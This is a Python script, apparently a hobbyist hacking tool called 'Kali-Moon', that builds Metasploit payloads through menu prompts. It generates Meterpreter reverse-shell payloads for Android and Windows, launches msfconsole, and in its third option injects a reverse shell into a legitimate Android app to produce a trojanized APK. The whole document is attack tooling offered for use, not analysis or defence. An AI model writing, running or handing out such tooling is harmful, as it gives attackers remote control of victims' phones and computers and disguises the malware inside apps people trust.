import os 
import time
import webbrowser
os.system("chmod +x * moon.py")
os.system("clear")

print("""\[\033[0;32m


 _  __     _ _           __  __                   
| |/ /__ _| (_)         |  \/  | ___   ___  _ __  
| ' // _` | | |  _____  | |\/| |/ _ \ / _ \| '_ \ 
| . \ (_| | | | |_____| | |  | | (_) | (_) | | | |
|_|\_\__,_|_|_|         |_|  |_|\___/ \___/|_| |_|
                                                


\033[0;34mBy : @O7ZXZ - Muntahi 

Telegram : https:t.me?OOO0S1

\033[0;36m-----------------------

\033[0;36m1 - payload android 

\033[0;36m2 - paload windows 

\033[0;36m3 -Androidpayload integration

\033[0;36m-----------------------


""")


q = input("\033[0;36mEnter number : ")


if q == "1":
    os.system("pwd")
    os.system("ifconfig")
    h = input("\033[0;32mEnter your host : ")
    p = input("\033[0;32mEnter port : ")
    n = input("\033[0;32mEnter name payload : ")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+h+ " LPORT="+p+" -o "+n+".apk")
    os.system("\n wait for metasploit started...!")
    time.sleep(1.3)
    os.system("msfconsole")

if q == "2":
    os.system("pwd")
    os.system("ifconfig") 
    h = input("\033[0;32mEnter your host : ")
    p = input("\033[0;32mEnter port : ")
    n = input("\033[0;32mEnter name payload : ")
    os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost="+h+ " lport="+p+" -f exe -o "+n+".exe")
    os.system("\n wait for metasploit started...!")
    time.sleep(1.3)
    os.system("msfconsole")


if q == "3":
    os.system("clear")
    print("----------------")

    print("\nFirst have be download applicaition for android ")
    print("\nSecound you must be diructry of download app or creat a new file and move this tool on the new file also move the app on this file...")
    print("\nThird you must be install apktool, zipalign, apksigner to avoid problem ")
    
    print("\n-----------")
    k = input("Are you install them ? : (y/n) : ")
    if k == "y":
        j = input("Enter name app which you want to merge : ")
        h = input("Enter lhost : ")
        p = input("Enter lport : ")
        n = input("Enter finale app : ")
        os.system("msfvenom --platform android --arch dalvik -x "+j+".apk -p android/meterpreter/reverse_tcp lhost="+h+ " lport="+p+ " -o "+n+".apk")
    else:
        print("\n\nif you want help for installation tools just enter ( y ) ")
        url = 'https://OOO0s1'
        webbrowser.open(url)



